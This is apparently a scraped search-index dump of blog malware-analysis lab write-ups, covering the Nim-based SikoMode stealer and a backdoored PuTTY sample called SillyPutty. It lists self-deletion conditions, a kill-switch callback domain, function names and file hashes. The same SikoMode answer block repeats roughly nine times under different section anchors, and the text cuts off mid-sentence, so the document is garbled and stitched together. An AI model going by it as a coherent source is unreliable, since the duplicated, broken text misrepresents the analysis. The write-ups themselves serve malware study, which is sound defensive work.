it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#6-under-what-conditions-can-you-get-the-binary-to-exfiltrate-data"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#7-what-is-the-exfiltration-domain"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#8-how-does-exfiltration-take-place"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#9-what-uri-is-used-to-exfiltrate-data"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#10-what-type-of-data-is-exfiltrated-the-file-is-cosmojpeg-but-how-exactly-is-the-files-data-transmitted"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#11-what-kind-of-encryption-algorithm-is-in-use"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#12-what-key-is-used-to-encrypt-the-data"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#13-what-is-the-significance-of-houdini"},{"categories":["Article"],"content":" Questions 1) What language is the binary written in?To know what language is the binary written in, I simply loaded it into Cutter. Then on the Dashboard tab, there is plenty of informations including the one I‚Äôm looking for. As you can see on the screenshot below, the malware has been written in Nim. As I wasn‚Äôt very sure about what Nim looked like, I searched some more informations on the Internet. Apparently, Nim was created to be a language as fast as C, as expressive as Python and as extensible as Lisp. Usually, malware authors use C or C++, Visual Basic and even Rust. Why bother using this language ? It‚Äôs because using a new programming language allow to bypass / avoid anti-malware protections. Indeed, at the beginning of its usage it wasn‚Äôt known from the AVs. Thus, there wasn‚Äôt any protections on hosts and it could run without being flagged. Fortunately, this is not the case anymore, to the extent that even legitimate Nim binary are being flagged, making it hard for developpers using this language as I read here: https://forum.nim-lang.org/t/9850. Also, when searching for the keyword Nim on Github, the third most popular repository is the OffensiveNim one. It shows that this language is pretty much used in offensive scenarios. It is also possible to know the language by analyzing the strings in the binary. Indeed, when using strings or FLOSS, I saw that a lot of them started by nim like nimMain, nimGetProcAddr and so on. 2) What is the architecture of this binary?To know what is the architecture of this binary, I opened it in PEStudio. As you can see on the screenshot below, it‚Äôs 64-bits. Cutter was also showing it in the Dashboard tab. 3) Under what conditions can you get the binary to delete itself?I noticed there was three different conditions under which the binary delete itself. Firstly, it will delete itself if the binary doesn‚Äôt have access to the internet and can‚Äôt contact the callback domain. WHat it does is send a TCP request on port 80 to the gateway. Then, there‚Äôs a DNS request to the domain update.ec12-4-109-278-3-ubuntu20-04.local. If it fails, i.e there‚Äôs no answers, it delete itself. I can confirm that supposition by inspecting the binary in Cutter. After displaying the graph of the sym.NimMainModule method, I noticed the following condition : On that screenshot, you can see the function checkKillSwitchURL being called. This is the one that will get the binary to send a request to the callback domain. Then there is the instruction test al, al followed by jne which is a conditional jump depending of the value of the ZF register. If it is equal to 0, meaning it returns true, it will continue its execution. Otherwise, it will delete itself by calling the houdini function (we will describe it later on, just assume this function is making the binary delete itself) If the internet connection gets interrupted, the binary will also delete itself. I noticed that by stopping INetSim during its execution. But there‚Äôs also a confirmation in the disassembled code in Cutter. This is the continuation of the previous screenshot. The checkKillSwitchURL returned true and the execution continues. Here you can see there‚Äôs again a test instruction followed by a jne instruction. This time, if the ZF regsiter is set to 0, it will call houdini and delete itself. Otherwise, it will continue its execution and call the unpackResources and stealStuff functions which is the normal execution of the binary. Thirdly, the binary will delete itself after its normal execution. Aswell as the two previous cases, I can verify that on Cutter : You can see that in both cases, the binary will call the houdini function, which means it‚Äôs bound to get rid of itself anyway. 4) Does the binary persist? If so, how?During my analysis, I didn‚Äôt find any persistance mechanism. On the contrary, it seems the binary is deleting itself after it did everything it needed to do (noticed by dynamic analysis in the previous question). 5) What is the first call","date":"2023-11-21","objectID":"/malware-analysis-sikomode/:4:0","series":null,"tags":["Malware","PMAT","Cutter","x64dbg"],"title":"Malware Analysis : SikoMode","uri":"/malware-analysis-sikomode/#bonus---retrieve-the-file-content"},{"categories":["Article"],"content":" Report - Malware Analysis - SillyPutty.exe Difficulty Start Date \u0026 Time Finish Date \u0026 Time Easy 09/11/2023 - 11h53 09/11/2023 - 12h46 ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:0:0","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#report---malware-analysis---sillyputtyexe"},{"categories":["Article"],"content":" Instructions Hello Analyst, The help desk has received a few calls from different IT admins regarding the attached program. They say that they've been using this program with no problems until recently. Now, it's crashing randomly and popping up blue windows when it's run. I don't like the sound of that. Do your thing! IR Team ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:1:0","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#instructions"},{"categories":["Article"],"content":" Basic Static Analysis","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:0","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#basic-static-analysis"},{"categories":["Article"],"content":" Tools File hashes VirusTotal FLOSS PEStudio PEView ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:1","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#tools"},{"categories":["Article"],"content":" Questions 1) What is the SHA256 hash of the sample?To find the SHA256 of the sample putty.exe, I used sha256sum.exe already available on FlareVM. I also calculated the MD5 with md5sum.exe. SHA256: 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 MD5: 334a10500feb0f3444bf2e86ab2e76da 2) What architecture is this binary?To get the architecture of putty.exe, I used PEStudio. Then, by clicking on the root directory, the architecture information will be available. As I can see, the architecture is 32-bit. 3) Are there any results from submitting the SHA256 hash to VirusTotal?Yes there is, as you can see on the screenshot below. (The VirusTotal result can be found here) I can see the file is flagged as malicious. However, I won‚Äôt dwell on VirusTotal. The aim here is to find the information by myself, as if the sample was still unknown. 4) Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?To pull the strings out of this binary, I used FLOSS with the command floss putty.exe \u003e output-floss.txt. From what I can see, the majority of the strings belong to the original PuTTY binary. Thus, it is difficult to spot any interesting strings. Supposition : the malicious actor has probably hidden some malicious code or a backdoor into the legitimate binary. This way, it is more difficult for a malware analyst to spot it quickly. 5) Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?To inspect the Import Address Table (IAT), I can again use PEStudio. Clicking on the imports section allows us to check the imported functions. As I said in the previous answer, the binary correspond to the legitime PuTTY binary with probably a backdoor in it. Thus, the inspection of the IAT doesn‚Äôt reveal anything interesting. However, from my perspective as a junior analyst, it‚Äôs quite appealing to import functions to add, delete and enumerate registry keys, even if in this case it‚Äôs legitimate. There is also functions like GetClipboardData and ShellExecuteA that are being imported. But those can also be legitimate for the regular usage of PuTTY. 6) Is it likely that this binary is packed?It doesn‚Äôt seem to be packed at first sight as I can read the IAT completely. But, I can verify it is not packed by comparing Virtual Size and Size of Raw Data of putty.exe. To do so, I have to open our binary in PEView. Then, by clicking on IMAGE_SECTION_HEADER .text, I can see the values I need. Size (in Hex) Size (in Dec) Virtual Size 00095F6D 614253 Size of Raw Data 00096000 614400 Size Difference 00000093 147 As I can see, the difference between the two is almost null. Since the size are almost equal, it means that thsi binary doesn‚Äôt seem to be packed. ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#questions"},{"categories":["Article"],"content":" Questions 1) What is the SHA256 hash of the sample?To find the SHA256 of the sample putty.exe, I used sha256sum.exe already available on FlareVM. I also calculated the MD5 with md5sum.exe. SHA256: 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 MD5: 334a10500feb0f3444bf2e86ab2e76da 2) What architecture is this binary?To get the architecture of putty.exe, I used PEStudio. Then, by clicking on the root directory, the architecture information will be available. As I can see, the architecture is 32-bit. 3) Are there any results from submitting the SHA256 